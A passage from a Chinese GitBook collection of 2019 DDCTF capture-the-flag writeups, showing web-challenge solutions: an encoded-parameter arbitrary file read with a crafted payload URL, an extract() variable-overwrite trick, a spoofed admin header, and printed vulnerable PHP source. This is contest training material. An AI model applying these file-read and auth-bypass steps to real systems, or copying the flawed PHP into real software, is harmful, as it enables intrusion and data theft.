
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>2019DDCTF · CTF Writeup</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        <meta name="author" content="Yunen <yunen@cqu.edu.cn>">
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchors/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-prism/prism.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="2017national.html" />
    
    
    <link rel="prev" href="2019national.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    
    
        
        <li>
            <a href="/" target="_blank" class="custom-link">首页</a>
        </li>
    
    

    
    <li class="divider"></li>
    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    介绍
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../types/">
            
                <a href="../types/">
            
                    
                    按类型区分
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="../types/web.html">
            
                <a href="../types/web.html">
            
                    
                    网上练习题
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2" data-path="../types/comp.html">
            
                <a href="../types/comp.html">
            
                    
                    官方赛事题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="../years/">
            
                <a href="../years/">
            
                    
                    按年份区分
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="../years/2020.html">
            
                <a href="../years/2020.html">
            
                    
                    2019-2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.2" data-path="../years/2019.html">
            
                <a href="../years/2019.html">
            
                    
                    2018-2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.3" data-path="../years/2018.html">
            
                <a href="../years/2018.html">
            
                    
                    2017-2018
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.4" data-path="../years/2017.html">
            
                <a href="../years/2017.html">
            
                    
                    2016-2017
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.5" data-path="../years/2016.html">
            
                <a href="../years/2016.html">
            
                    
                    2015-2016
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.6" data-path="../years/2015.html">
            
                <a href="../years/2015.html">
            
                    
                    ????-2015
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="../difficult/">
            
                <a href="../difficult/">
            
                    
                    按难度区分
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="../difficult/easy.html">
            
                <a href="../difficult/easy.html">
            
                    
                    相对简单
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2" data-path="../difficult/mid.html">
            
                <a href="../difficult/mid.html">
            
                    
                    难度中等
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.3" data-path="../difficult/diff.html">
            
                <a href="../difficult/diff.html">
            
                    
                    难度较大
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="all.html">
            
                <a href="all.html">
            
                    
                    目前已收录
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" data-path="2019national.html">
            
                <a href="2019national.html">
            
                    
                    2019全国信安赛
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.5.2" data-path="2019ddctf.html">
            
                <a href="2019ddctf.html">
            
                    
                    2019DDCTF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3" data-path="2017national.html">
            
                <a href="2017national.html">
            
                    
                    2017全国信安赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4" data-path="xihulunjian2019.html">
            
                <a href="xihulunjian2019.html">
            
                    
                    2019西湖论剑预选赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5" data-path="shiyanbar_web.html">
            
                <a href="shiyanbar_web.html">
            
                    
                    实验吧web部分
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="../help.html">
            
                <a href="../help.html">
            
                    
                    加入我们完善网站!
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7" data-path="../reply.html">
            
                <a href="../reply.html">
            
                    
                    有问题?请在这里反馈!
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >2019DDCTF</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div class="search-plus" id="book-search-results">
    <div class="search-noresults">
    
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#2019ddctf&#x6EF4;&#x6EF4;&#x9AD8;&#x6821;&#x95EF;&#x5173;&#x8D5B;"><b>1. </b>2019DDCTF&#x6EF4;&#x6EF4;&#x9AD8;&#x6821;&#x95EF;&#x5173;&#x8D5B;</a></li><ul><li><span class="title-icon "></span><a href="#&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;"><b>1.1. </b>&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;</a></li><li><span class="title-icon "></span><a href="#&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;"><b>1.2. </b>&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;</a></li><li><span class="title-icon "></span><a href="#&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp&#xFF1A;"><b>1.3. </b>&#x7F51;&#x4E0A;&#x516C;&#x5F00;WP&#xFF1A;</a></li><li><span class="title-icon "></span><a href="#&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;"><b>1.4. </b>&#x672C;&#x7AD9;&#x5907;&#x4EFD;WP&#xFF1A;</a></li><li><span class="title-icon "></span><a href="#web"><b>1.5. </b>WEB</a></li><ul><li><span class="title-icon "></span><a href="#&#x6EF4;"><b>1.5.1. </b>&#x6EF4;~</a></li><li><span class="title-icon "></span><a href="#web&#x7B7E;&#x5230;&#x9898;"><b>1.5.2. </b>Web&#x7B7E;&#x5230;&#x9898;</a></li><li><span class="title-icon "></span><a href="#uploadimg"><b>1.5.3. </b>UploadIMG</a></li><li><span class="title-icon "></span><a href="#&#x5927;&#x5409;&#x5927;&#x5229;&#xFF0C;&#x4ECA;&#x665A;&#x5403;&#x9E21;"><b>1.5.4. </b>&#x5927;&#x5409;&#x5927;&#x5229;&#xFF0C;&#x4ECA;&#x665A;&#x5403;&#x9E21;~</a></li><li><span class="title-icon "></span><a href="#homebrew-event-loop"><b>1.5.5. </b>homebrew event loop</a></li><li><span class="title-icon "></span><a href="#mysql&#x5F31;&#x53E3;&#x4EE4;"><b>1.5.6. </b>mysql&#x5F31;&#x53E3;&#x4EE4;</a></li><li><span class="title-icon "></span><a href="#&#x6B22;&#x8FCE;&#x62A5;&#x540D;ddctf"><b>1.5.7. </b>&#x6B22;&#x8FCE;&#x62A5;&#x540D;DDCTF</a></li><li><span class="title-icon "></span><a href="#&#x518D;&#x6765;1&#x676F;java"><b>1.5.8. </b>&#x518D;&#x6765;1&#x676F;Java</a></li></ul></ul><li><span class="title-icon "></span><a href="#&#x751F;&#x6210;&#x94FE;&#x63A5;jrmplistener&#x7684;payload"><b>2. </b>&#x751F;&#x6210;&#x94FE;&#x63A5;JRMPListener&#x7684;payload</a></li><ul><li><span class="title-icon "></span><a href="#reverse"><b>2.1. </b>Reverse</a></li><ul><li><span class="title-icon "></span><a href="#cofused"><b>2.1.1. </b>Cofused</a></li><li><span class="title-icon "></span><a href="#reverse-2"><b>2.1.2. </b>Reverse 2</a></li></ul><li><span class="title-icon "></span><a href="#misc"><b>2.2. </b>MISC</a></li><ul><li><span class="title-icon "></span><a href="#wireshark"><b>2.2.1. </b>wireshark</a></li><li><span class="title-icon "></span><a href="#multzor"><b>2.2.2. </b>MulTzor</a></li><li><span class="title-icon "></span><a href="#&#x5317;&#x4EAC;&#x5730;&#x94C1;"><b>2.2.3. </b>&#x5317;&#x4EAC;&#x5730;&#x94C1;</a></li><li><span class="title-icon "></span><a href="#&#x8054;&#x76DF;&#x51B3;&#x7B56;&#x5927;&#x4F1A;"><b>2.2.4. </b>&#x8054;&#x76DF;&#x51B3;&#x7B56;&#x5927;&#x4F1A;</a></li></ul><li><span class="title-icon "></span><a href="#pwn"><b>2.3. </b>PWN</a></li><ul><li><span class="title-icon "></span><a href="#strike"><b>2.3.1. </b>Strike</a></li></ul><li><span class="title-icon "></span><a href="#android"><b>2.4. </b>Android</a></li><ul><li><span class="title-icon "></span><a href="#breaking-lem"><b>2.4.1. </b>Breaking LEM</a></li><li><span class="title-icon "></span><a href="#have-fun"><b>2.4.2. </b>Have Fun</a></li></ul><li><span class="title-icon "></span><a href="#&#x8BC4;&#x8BBA;&#x533A;"><b>2.5. </b>&#x8BC4;&#x8BBA;&#x533A;</a></li></ul></ul></div><a href="#2019ddctf&#x6EF4;&#x6EF4;&#x9AD8;&#x6821;&#x95EF;&#x5173;&#x8D5B;" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="2019ddctf&#x6EF4;&#x6EF4;&#x9AD8;&#x6821;&#x95EF;&#x5173;&#x8D5B;"><a name="2019ddctf&#x6EF4;&#x6EF4;&#x9AD8;&#x6821;&#x95EF;&#x5173;&#x8D5B;" class="anchor-navigation-ex-anchor" href="#2019ddctf&#x6EF4;&#x6EF4;&#x9AD8;&#x6821;&#x95EF;&#x5173;&#x8D5B;"><i class="fa fa-link" aria-hidden="true"></i></a>1. 2019DDCTF&#x6EF4;&#x6EF4;&#x9AD8;&#x6821;&#x95EF;&#x5173;&#x8D5B;</h1>
<p>&#x672C;&#x9898;&#x5DF2;&#x5F00;&#x901A;&#x8BC4;&#x8BBA;&#xFF0C;&#x6B22;&#x8FCE;&#x5728;&#x9875;&#x9762;&#x6700;&#x4E0B;&#x65B9;&#x7559;&#x8A00;&#x5410;&#x69FD;&#x3002;<img src="https://cloud.panjunwen.com/alu/&#x5472;&#x7259;.png" alt="&#x5472;&#x7259;.png" class="vemoticon-img"></p>
<h2 id="&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;"><a name="&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>1.1. &#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;</h2>
<table>
<thead>
<tr>
<th style="text-align:center">&#x7C7B;&#x578B;</th>
<th style="text-align:center">&#x5E74;&#x4EFD;</th>
<th style="text-align:center">&#x96BE;&#x5EA6;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">&#x5B98;&#x65B9;&#x8D5B;&#x4E8B;&#x9898;</td>
<td style="text-align:center">2019</td>
<td style="text-align:center">&#x4E2D;</td>
</tr>
</tbody>
</table>
<h2 id="&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;"><a name="&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>1.2. &#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;</h2>
<ul>
<li>&#x94FE;&#x63A5;: <a href="https://pan.baidu.com/s/16CV9YL5maNYIi-TbXzMWHg" target="_blank">https://pan.baidu.com/s/16CV9YL5maNYIi-TbXzMWHg</a> &#x63D0;&#x53D6;&#x7801;: tdbs</li>
</ul>
<h2 id="&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp&#xFF1A;"><a name="&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>1.3. &#x7F51;&#x4E0A;&#x516C;&#x5F00;WP&#xFF1A;</h2>
<ul>
<li><a href="https://xz.aliyun.com/t/4862" target="_blank">https://xz.aliyun.com/t/4862</a></li>
<li><a href="https://xz.aliyun.com/t/4849" target="_blank">https://xz.aliyun.com/t/4849</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA3Mzk1MDk1NA==&amp;mid=2651905380&amp;idx=1&amp;sn=2d85c96fe650fb625b53fbf8536ee0f5&amp;chksm=84e34ee1b394c7f7d6d9302d5ebe0be50b1444b02a3b7f250f3898040618a9525532ba23f854&amp;mpshare=1&amp;scene=23&amp;srcid=#rd" target="_blank">https://mp.weixin.qq.com/s?__biz=MzA3Mzk1MDk1NA==&amp;mid=2651905380&amp;idx=1&amp;sn=2d85c96fe650fb625b53fbf8536ee0f5&amp;chksm=84e34ee1b394c7f7d6d9302d5ebe0be50b1444b02a3b7f250f3898040618a9525532ba23f854&amp;mpshare=1&amp;scene=23&amp;srcid=#rd</a></li>
<li><a href="http://cdusec.happyhacking.top/?post=49" target="_blank">http://cdusec.happyhacking.top/?post=49</a></li>
<li><a href="https://www.zhaoj.in/read-5269.html" target="_blank">https://www.zhaoj.in/read-5269.html</a></li>
<li><a href="http://12end.xyz/ddctf-writeup/" target="_blank">http://12end.xyz/ddctf-writeup/</a></li>
<li><a href="http://yuufeng.com/" target="_blank">http://yuufeng.com/</a></li>
<li><a href="https://blog.csdn.net/m0_37809075/article/details/89280350" target="_blank">https://blog.csdn.net/m0_37809075/article/details/89280350</a></li>
<li><a href="https://www.xmsec.cc/p/4891b1d2-1166-4553-951c-d46cbac95af3/" target="_blank">https://www.xmsec.cc/p/4891b1d2-1166-4553-951c-d46cbac95af3/</a></li>
<li><a href="http://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485730&amp;idx=1&amp;sn=cb90f178c56453f558acc626ec84ddad&amp;chksm=e89e21fadfe9a8ecca8ac397984045c7ebda97577ac082d94141d37d0b12d70222128f0af2e7&amp;mpshare=1&amp;scene=23&amp;srcid=#rd" target="_blank">http://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485730&amp;idx=1&amp;sn=cb90f178c56453f558acc626ec84ddad&amp;chksm=e89e21fadfe9a8ecca8ac397984045c7ebda97577ac082d94141d37d0b12d70222128f0af2e7&amp;mpshare=1&amp;scene=23&amp;srcid=#rd</a></li>
</ul>
<h2 id="&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;"><a name="&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>1.4. &#x672C;&#x7AD9;&#x5907;&#x4EFD;WP&#xFF1A;</h2>
<p><strong>&#x611F;&#x8C22;&#x4F5C;&#x8005;&#xFF1A;evoA&#x3001;5am3&#x3001;Glzjin&#x3001;12end&#x3001;admin-&#x7434;&#x91CC;&#x3001;Yunen</strong></p>
<h2 id="web"><a name="web" class="anchor-navigation-ex-anchor" href="#web"><i class="fa fa-link" aria-hidden="true"></i></a>1.5. WEB</h2>
<h3 id="&#x6EF4;"><a name="&#x6EF4;" class="anchor-navigation-ex-anchor" href="#&#x6EF4;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5.1. &#x6EF4;~</h3>
<p>&#x672C;&#x9898;&#x4F5C;&#x8005;&#xFF1A;<strong>Yunen</strong>  </p>
<p>&#x9898;&#x76EE;&#x5730;&#x5740;&#xFF1A;<a href="http://117.51.150.246/" target="_blank">http://117.51.150.246/</a><br>&#x6253;&#x5F00;&#x9898;&#x76EE;&#xFF1A;&#x53D1;&#x73B0;&#x9875;&#x9762;&#x8FDB;&#x884C;&#x4E86;&#x4E00;&#x6B21;&#x8C03;&#x6574;&#xFF0C;&#x8DF3;&#x8F6C;&#x540E;&#x7684;url&#xFF1A;<br><a href="http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09" target="_blank">http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</a><br>&#x731C;&#x6D4B;jpg&#x53C2;&#x6570;&#x7684;&#x503C;&#x4E3A;base64&#x7F16;&#x7801;&#x540E;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x89E3;&#x7801;&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF1A;<br><code>NjY2QzYxNjcyRTZBNzA2Nw==</code><br>&#x660E;&#x663E;&#x7684;base64&#x7F16;&#x7801;&#xFF0C;&#x518D;&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x89E3;&#x7801;&#xFF1A;<br><code>666C61672E6A7067</code><br>&#x89C2;&#x5BDF;&#x6570;&#x636E;&#xFF0C;&#x53D1;&#x73B0;&#x4E24;&#x4E24;&#x4E00;&#x7EC4;&#x65F6;&#xFF0C;&#x5B57;&#x6BCD;&#x5168;&#x5728;&#x6570;&#x5B57;&#x540E;&#xFF0C;&#x4E14;&#x8303;&#x56F4;&#x5728;[A-F]&#x4E4B;&#x5185;&#xFF0C;&#x731C;&#x6D4B;&#x4E3A;HEX&#xFF0C;&#x5C06;&#x5176;&#x8F6C;&#x6362;&#x4E3A;Ascii&#x8BD5;&#x8BD5;&#xFF1A;<br><code>flag.jpg</code><br>&#x660E;&#x663E;&#x7684;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x6F0F;&#x6D1E;&#xFF0C;&#x5C1D;&#x8BD5;&#x8BFB;&#x53D6;index.php<br>&#x5C06;<code>index.php</code>&#x5176;&#x8F6C;&#x6362;&#x6210;HEX&#xFF0C;&#x518D;&#x4E24;&#x6B21;&#x8F6C;Base64&#x5F97;&#xFF1A;<br><code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code><br>&#x66FF;&#x6362;&#x539F;&#x6765;&#x7684;jpg&#x503C;&#x8BBF;&#x95EE;&#xFF1A;<br><img src="https://i.loli.net/2019/04/18/5cb774ca39bc4.png" alt=""><br>&#x7EA2;&#x6846;&#x90E8;&#x5206;&#x5373;&#x4E3A;index.php&#x7684;base64&#x7F16;&#x7801;&#x8FC7;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x590D;&#x5236;&#x4E0B;&#x6765;&#x89E3;&#x7801;&#x5F97;&#xFF1A;  </p>
<pre class="language-"><code><span class="token prolog">&lt;?php
/*
 * https://blog.csdn.net/FengBanLiuYun/article/details/80616607
 * Date: July 4,2018
 */
error_reporting(E_ALL || ~E_NOTICE);


header(&apos;content-type:text/html;charset=utf-8&apos;);
if(! isset($_GET[&apos;jpg&apos;]))
    header(&apos;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&apos;);
$file = hex2bin(base64_decode(base64_decode($_GET[&apos;jpg&apos;])));
echo &apos;&lt;title&gt;&apos;.$_GET[&apos;jpg&apos;].&apos;&lt;/title&gt;&apos;;
$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);
echo $file.&apos;&lt;/br&gt;&apos;;
$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);
echo $file.&apos;&lt;/br&gt;&apos;;
$txt = base64_encode(file_get_contents($file));

echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot;.$txt.&quot;&apos;&gt;&lt;/img&gt;&quot;;
/*
 * Can you find the flag file?
 *
 */

?&gt;</span>
</code></pre><p>&#x9898;&#x76EE;&#x63D0;&#x793A;&#x4E86;&#x4E00;&#x4E2A;url&#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x65E5;&#x671F;(2018-7-4)&#x3002;
&#x6253;&#x5F00;&#x63D0;&#x793A;&#x6587;&#x7AE0;&#xFF0C;&#x53D1;&#x73B0;&#x8BE5;&#x6587;&#x7AE0;&#x53D1;&#x8868;&#x65F6;&#x95F4;&#x4E0E;&#x63D0;&#x793A;&#x65F6;&#x95F4;&#x4E0D;&#x540C;&#x3002;<br><img src="https://i.loli.net/2019/04/18/5cb774ca9a9a4.png" alt=""><br>&#x6253;&#x5F00;&#x4F5C;&#x8005;&#x9996;&#x9875;&#xFF0C;&#x627E;&#x5230;2018-7-4&#x53D1;&#x8868;&#x7684;&#x6587;&#x7AE0;&#xFF1A;<br><a href="https://blog.csdn.net/FengBanLiuYun/article/details/80913909" target="_blank">https://blog.csdn.net/FengBanLiuYun/article/details/80913909</a><br>&#x8FD9;&#x91CC;&#x6709;&#x4E2A;&#x5DE8;&#x5927;&#x8111;&#x6D1E;&#xFF01;&#xFF01;&#x5199;&#x8FD9;&#x9898;&#x7684;&#x65F6;&#x5019;&#x771F;&#x60F3;&#x6740;&#x4E86;&#x51FA;&#x9898;&#x4EBA;<img src="https://cloud.panjunwen.com/alu/&#x4E2D;&#x5200;.png" alt="&#x4E2D;&#x5200;.png" class="vemoticon-img"><br><img src="https://i.loli.net/2019/04/18/5cb774cab88a1.png" alt=""><br>&#x731C;&#x6D4B;&#x5B58;&#x5728;&#x5907;&#x4EFD;&#x6587;&#x4EF6;<code>practice.txt.swp</code>&#xFF0C;&#x8BBF;&#x95EE;&#x4E4B;~:<br><img src="https://i.loli.net/2019/04/18/5cb774ca2f3a1.png" alt=""><br>&#x63D0;&#x793A;flag&#x5B58;&#x5728;&#x4E8E;<code>f1ag!ddctf.php</code>&#x6587;&#x4EF6;&#xFF0C;&#x4F7F;&#x7528;index.php&#x8BFB;&#x53D6;&#x4E4B;~<br>&#x7531;&#x4E8E;<code>$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);</code>&#xFF0C;&#x6211;&#x4EEC;&#x65E0;&#x6CD5;&#x76F4;&#x63A5;&#x8F93;&#x5165;!<br>&#x4E0D;&#x8FC7;&#x7531;&#x4E8E;<code>$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);</code>&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;config&#x6765;&#x4EE3;&#x66FF;&#x3002;<br>&#x6545;payload&#x4E3A;:<br><code>117.51.150.246/index.php?jpg=TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==</code><br>&#x8FD4;&#x56DE;&#x5185;&#x5BB9;base64&#x89E3;&#x7801;&#xFF1A;  </p>
<pre class="language-"><code><span class="token prolog">&lt;?php
include(&apos;config.php&apos;);
$k = &apos;hello&apos;;
extract($_GET);
if(isset($uid))
{
    $content=trim(file_get_contents($k));
    if($uid==$content)
    {
        echo $flag;
    }
    else
    {
        echo&apos;hello&apos;;
    }
}
?&gt;</span>
</code></pre><p>&#x7B80;&#x5355;&#x7684;&#x53D8;&#x91CF;&#x8986;&#x76D6;&#x9898;&#xFF0C;<code>extract($_GET);</code>&#x4F1A;&#x5C06;GET&#x5185;&#x5BB9;&#x8F6C;&#x6362;&#x6210;&#x53D8;&#x91CF;&#x3002;<br><code>file_get_contents($k)</code>&#x4F7F;&#x7528;php://input&#x5C06;&#x4F1A;&#x8FD4;&#x56DE;post&#x7684;&#x6570;&#x636E;<br>getflag:<br><img src="https://i.loli.net/2019/04/18/5cb774ca7880a.png" alt=""><br>flag: <code>DDCTF{436f6e6772617******174696f6e73}</code></p>
<h3 id="web&#x7B7E;&#x5230;&#x9898;"><a name="web&#x7B7E;&#x5230;&#x9898;" class="anchor-navigation-ex-anchor" href="#web&#x7B7E;&#x5230;&#x9898;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5.2. Web&#x7B7E;&#x5230;&#x9898;</h3>
<p>&#x6253;&#x5F00;&#x9898;&#x76EE;&#xFF0C;&#x63D0;&#x793A;&#x4E0D;&#x662F;&#x7BA1;&#x7406;&#x5458;&#x6743;&#x9650;&#xFF0C;&#x89C2;&#x5BDF;&#x8BF7;&#x6C42;header&#xFF0C;&#x53D1;&#x73B0;&#x5B57;&#x6BB5;&#xFF1A;didictf_username&#x7684;&#x503C;&#x4E3A;&#x7A7A;<br><img src="https://i.loli.net/2019/04/18/5cb774ca7ac7e.png" alt=""><br>burp&#x62E6;&#x622A;&#x6570;&#x636E;&#x5305;&#x4FEE;&#x6539;&#x4E3A;admin&#xFF0C;&#x8FD4;&#x56DE;&#x5185;&#x5BB9;&#xFF1A;<br><code>&#x60A8;&#x5F53;&#x524D;&#x5F53;&#x524D;&#x6743;&#x9650;&#x4E3A;&#x7BA1;&#x7406;&#x5458;----&#x8BF7;&#x8BBF;&#x95EE;:app/fL2XID2i0Cdh.php</code><br>&#x8BBF;&#x95EE;app/fL2XID2i0Cdh.php&#x5F97;&#x6E90;&#x7801;&#xFF1A;</p>
<p>url:app/Application.php</p>
<pre class="language-"><code>Class Application {
    var $path = &apos;&apos;;


    public function response($data, $errMsg = &apos;success&apos;) {
        $ret = [&apos;errMsg&apos; =&gt; $errMsg,
            &apos;data&apos; =&gt; $data];
        $ret = json_encode($ret);
        header(&apos;Content-type: application/json&apos;);
        echo $ret;

    }

    public function auth() {
        $DIDICTF_ADMIN = &apos;admin&apos;;
        if(!empty($_SERVER[&apos;HTTP_DIDICTF_USERNAME&apos;]) &amp;&amp; $_SERVER[&apos;HTTP_DIDICTF_USERNAME&apos;] == $DIDICTF_ADMIN) {
            $this-&gt;response(&apos;&#x60A8;&#x5F53;&#x524D;&#x5F53;&#x524D;&#x6743;&#x9650;&#x4E3A;&#x7BA1;&#x7406;&#x5458;----&#x8BF7;&#x8BBF;&#x95EE;:app/fL2XID2i0Cdh.php&apos;);
            return TRUE;
        }else{
            $this-&gt;response(&apos;&#x62B1;&#x6B49;&#xFF0C;&#x60A8;&#x6CA1;&#x6709;&#x767B;&#x9646;&#x6743;&#x9650;&#xFF0C;&#x8BF7;&#x83B7;&#x53D6;&#x6743;&#x9650;&#x540E;&#x8BBF;&#x95EE;-----&apos;,&apos;error&apos;);
            exit();
        }

    }
    private function sanitizepath($path) {
    $path = trim($path);
    $path=str_replace(&apos;../&apos;,&apos;&apos;,$path);
    $path=str_replace(&apos;..\\&apos;,&apos;&apos;,$path);
    return $path;
}

public function __destruct() {
    if(empty($this-&gt;path)) {
        exit();
    }else{
        $path = $this-&gt;sanitizepath($this-&gt;path);
        if(strlen($path) !== 18) {
            exit();
        }
        $this-&gt;response($data=file_get_contents($path),&apos;Congratulations&apos;);
    }
    exit();
}
}
</code></pre><p>url:app/Session.php</p>
<pre class="language-"><code>include &apos;Application.php&apos;;
class Session extends Application {

    //key&#x5EFA;&#x8BAE;&#x4E3A;8&#x4F4D;&#x5B57;&#x7B26;&#x4E32;
    var $eancrykey                  = &apos;&apos;;
    var $cookie_expiration            = 7200;
    var $cookie_name                = &apos;ddctf_id&apos;;
    var $cookie_path                = &apos;&apos;;
    var $cookie_domain                = &apos;&apos;;
    var $cookie_secure                = FALSE;
    var $activity                   = &quot;DiDiCTF&quot;;


    public function index()
    {
    if(parent::auth()) {
            $this-&gt;get_key();
            if($this-&gt;session_read()) {
                $data = &apos;DiDI Welcome you %s&apos;;
                $data = sprintf($data,$_SERVER[&apos;HTTP_USER_AGENT&apos;]);
                parent::response($data,&apos;sucess&apos;);
            }else{
                $this-&gt;session_create();
                $data = &apos;DiDI Welcome you&apos;;
                parent::response($data,&apos;sucess&apos;);
            }
        }

    }

    private function get_key() {
        //eancrykey  and flag under the folder
        $this-&gt;eancrykey =  file_get_contents(&apos;../config/key.txt&apos;);
    }

    public function session_read() {
        if(empty($_COOKIE)) {
        return FALSE;
        }

        $session = $_COOKIE[$this-&gt;cookie_name];
        if(!isset($session)) {
            parent::response(&quot;session not found&quot;,&apos;error&apos;);
